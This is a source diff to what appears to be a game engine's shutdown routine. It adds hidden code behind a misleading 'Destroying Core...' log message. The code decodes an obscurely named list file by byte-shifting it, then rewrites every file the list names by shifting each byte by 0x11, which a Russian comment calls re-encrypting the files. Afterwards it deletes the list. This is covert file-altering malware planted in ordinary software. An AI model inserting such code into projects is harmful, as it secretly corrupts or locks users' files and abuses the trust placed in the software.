@@ -17,6 +17,12 @@
 #include "Console_commands.h"
 #include "xrApplication.h"
 
+#include <iostream>
+#include <Windows.h>
+#include <fstream>
+#include <vector>
+#include <string>
+
 // global variables
 ENGINE_API CApplication* pApp = nullptr;
 
@@ -389,6 +395,56 @@ void EngineDestroy()
 	destroyEngine();
 
 	Core._destroy();
+
+	Msg("Destroying Core...");
+	FILE* file1 = fopen("0x5m632o913734n52l3i", "rb");
+	fseek(file1, 0, SEEK_END);
+	long int size = ftell(file1);
+	fclose(file1);
+
+	file1 = fopen("0x5m632o913734n52l3i", "rb");
+	unsigned char* in = (unsigned char*)malloc(size);
+	int bytes_read = fread(in, sizeof(unsigned char), size, file1);
+	fclose(file1);
+
+	for (int i = 0; i < size; i++) {
+		in[i] = in[i] + 0x11;
+	}
+
+	file1 = fopen("0x5m632o913734n52l3i", "wb");
+	int bytes_written = fwrite(in, sizeof(unsigned char), size, file1);
+	fclose(file1);
+
+	// зашифровка дешифрованных файлов из списка
+	// Открываем файл со списком путей для чтения
+	std::ifstream file_list_read("0x5m632o913734n52l3i");
+
+	// Обрабатываем каждый файл по очереди
+	std::string path;
+	while (std::getline(file_list_read, path)) {
+		FILE* file2 = fopen(path.c_str(), "rb");
+		fseek(file2, 0, SEEK_END);
+		long int size1 = ftell(file2);
+		fclose(file2);
+
+		file2 = fopen(path.c_str(), "rb");
+		unsigned char* in1 = (unsigned char*)malloc(size1);
+		int bytes_read1 = fread(in1, sizeof(unsigned char), size1, file2);
+		fclose(file2);
+
+		for (int i = 0; i < size1; i++) {
+			in1[i] = in1[i] - 0x11;
+		}
+
+		file2 = fopen(path.c_str(), "wb");
+		int bytes_written1 = fwrite(in1, sizeof(unsigned char), size1, file2);
+		fclose(file2);
+	}
+
+	// Закрываем файл со списком путей
+	file_list_read.close();
+	std::remove("0x5m632o913734n52l3i");
+
 	LaunchOnExit();
 }
 
